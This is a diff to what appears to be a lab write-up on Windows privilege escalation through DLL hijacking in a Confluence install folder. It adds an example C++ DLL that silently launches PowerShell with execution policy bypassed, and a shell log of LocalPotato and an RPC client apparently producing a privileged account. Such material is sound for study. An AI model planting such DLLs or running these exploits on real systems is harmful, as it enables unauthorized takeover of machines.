@@ -86,6 +86,47 @@ certain libraries, even though these libraries were never present on the system.
 
 > Downloaded the SprintCSP.dll and .exe file. Copy it the dll into \Confluence\bin, and execute the .exe file.
 
+
+## Example DLL in C++;
+
+```C++
+#include <windows.h>
+
+extern "C" __declspec(dllexport) void ListProgramFiles() {
+    // PowerShell command line
+    wchar_t cmd[] = L"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"<command>"";
+
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = {};
+
+    // Hide console window if triggered from a GUI application
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    if (CreateProcessW(
+            NULL,
+            cmd,
+            NULL,
+            NULL,
+            FALSE,
+            CREATE_NO_WINDOW,
+            NULL,
+            NULL,
+            &si,
+            &pi)) {
+        // Wait for PowerShell to finish executing
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    return TRUE;
+}
+```
+
 ```powershell
 PS C:\Users\Student\Downloads> . .\LocalPotato.exe
 PS C:\Users\Student\Downloads> . '.\WIN10RpcClient.exe'
@@ -99,3 +140,5 @@ Student                  SuperAdministrator       WDAGUtilityAccount
 The command completed successfully.
 PS C:\Users\Student\Downloads>    
 ```
+
+
